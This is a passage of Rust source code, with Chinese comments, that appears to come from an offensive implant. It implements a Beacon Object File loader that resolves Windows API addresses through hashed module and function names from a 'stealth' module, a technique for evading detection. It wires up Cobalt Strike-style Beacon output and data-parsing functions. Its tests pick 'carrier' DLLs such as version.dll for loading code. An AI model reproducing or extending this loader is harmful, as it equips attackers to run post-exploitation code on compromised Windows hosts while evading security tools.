                    ) {
                        // 缓存结果
                        if let Ok(mut cache) = SYMBOL_CACHE.lock() {
                            cache.insert(name.to_string(), addr);
                        }
                        return addr;
                    }
                }
            }
        }

        // 格式 2 & 3: 标准 COFF 格式
        // 移除 stdcall 装饰符 (例如: _CreateFileW@12 -> CreateFileW)
        let api_name = if clean_name.starts_with('_') {
            // stdcall: _API@N
            let without_underscore = &clean_name[1..];
            if let Some(at_pos) = without_underscore.find('@') {
                &without_underscore[..at_pos]
            } else {
                without_underscore
            }
        } else {
            // cdecl: API
            clean_name
        };

        // 尝试在常见的系统 DLL 中查找
        let common_modules = [
            "KERNEL32.DLL",
            "NTDLL.DLL",
            "USER32.DLL",
            "ADVAPI32.DLL",
            "WS2_32.DLL",
            "MSVCRT.DLL",
        ];

        unsafe {
            for module in &common_modules {
                let h_module = crate::stealth::get_module_base(crate::stealth::hash_module_name(
                    module.as_bytes(),
                ));
                if h_module != 0 {
                    // 尝试原始名称
                    if let Some(addr) = crate::stealth::get_api_addr(
                        h_module,
                        crate::stealth::hash_api_name(api_name.as_bytes()),
                    ) {
                        debug!("[+] Resolved {} -> 0x{:X} (from {})", name, addr, module);
                        // 缓存结果
                        if let Ok(mut cache) = SYMBOL_CACHE.lock() {
                            cache.insert(name.to_string(), addr);
                        }
                        return addr;
                    }

                    // 尝试添加 A 后缀 (ANSI 版本)
                    let ansi_name = format!("{}A", api_name);
                    if let Some(addr) = crate::stealth::get_api_addr(
                        h_module,
                        crate::stealth::hash_api_name(ansi_name.as_bytes()),
                    ) {
                        debug!(
                            "[+] Resolved {} -> 0x{:X} (from {}, ANSI)",
                            name, addr, module
                        );
                        // 缓存结果
                        if let Ok(mut cache) = SYMBOL_CACHE.lock() {
                            cache.insert(name.to_string(), addr);
                        }
                        return addr;
                    }

                    // 尝试添加 W 后缀 (Unicode 版本)
                    let wide_name = format!("{}W", api_name);
                    if let Some(addr) = crate::stealth::get_api_addr(
                        h_module,
                        crate::stealth::hash_api_name(wide_name.as_bytes()),
                    ) {
                        debug!(
                            "[+] Resolved {} -> 0x{:X} (from {}, Unicode)",
                            name, addr, module
                        );
                        // 缓存结果
                        if let Ok(mut cache) = SYMBOL_CACHE.lock() {
                            cache.insert(name.to_string(), addr);
                        }
                        return addr;
                    }
                }
            }
        }

        warn!("[!] Failed to resolve external symbol: {}", name);
        // 缓存失败结果 (避免重复查找)
        if let Ok(mut cache) = SYMBOL_CACHE.lock() {
            cache.insert(name.to_string(), 0);
        }
        0
    }

    fn resolve_internal_beacon(name: &str) -> usize {
        match name {
            // 基础输出 API
            "BeaconPrintf" => beacon_api::BeaconPrintf as usize,
            "BeaconOutput" => beacon_api::BeaconOutput as usize,

            // 数据解析 API
            "BeaconDataParse" => beacon_api::BeaconDataParse as usize,
            "BeaconDataInt" => beacon_api::BeaconDataInt as usize,
            "BeaconDataShort" => beacon_api::BeaconDataShort as usize,
            "BeaconDataLength" => beacon_api::BeaconDataLength as usize,
            "BeaconDataExtract" => beacon_api::BeaconDataExtract as usize,

            // 格式化输出 API
            "BeaconFormatAlloc" => beacon_api::BeaconFormatAlloc as usize,
            "BeaconFormatReset" => beacon_api::BeaconFormatReset as usize,
            "BeaconFormatFree" => beacon_api::BeaconFormatFree as usize,
            "BeaconFormatAppend" => beacon_api::BeaconFormatAppend as usize,
            "BeaconFormatPrintf" => beacon_api::BeaconFormatPrintf as usize,
            "BeaconFormatToString" => beacon_api::BeaconFormatToString as usize,
            "BeaconFormatInt" => beacon_api::BeaconFormatInt as usize,

            _ => {
                warn!("[!] BOF Loader: Unimplemented internal API: {}", name);
                0
            }
        }
    }

    unsafe fn get_symbol_name(sym: &CoffSymbol, str_table: *const u8) -> String {
        if sym.name[0] == 0 && sym.name[1] == 0 && sym.name[2] == 0 && sym.name[3] == 0 {
            let offset = u32::from_le_bytes([sym.name[4], sym.name[5], sym.name[6], sym.name[7]]);
            std::ffi::CStr::from_ptr(str_table.add(offset as usize) as *const i8)
                .to_string_lossy()
                .into_owned()
        } else {
            String::from_utf8_lossy(&sym.name)
                .trim_matches('\0')
                .to_string()
        }
    }
}

#[cfg(test)]
mod reloc_bounds_tests {
    use super::BofLoader;

    #[test]
    fn symbol_index_bounds_helper() {
        assert!(BofLoader::reloc_symbol_index_in_bounds(0, 1));
        assert!(BofLoader::reloc_symbol_index_in_bounds(2, 3));
        assert!(!BofLoader::reloc_symbol_index_in_bounds(3, 3));
        assert!(!BofLoader::reloc_symbol_index_in_bounds(0, 0));
        assert!(!BofLoader::reloc_symbol_index_in_bounds(u32::MAX, 1));
    }

    #[test]
    fn carrier_list_not_only_xpsprint() {
        let cands = BofLoader::carrier_candidates(false);
        assert!(cands.len() >= 3);
        assert!(cands.iter().any(|p| p.contains("version.dll")));
        // xpsprint may remain as last-resort fallback but must not be the only option
        assert!(cands.iter().any(|p| !p.contains("xpsprint")));
    }
}
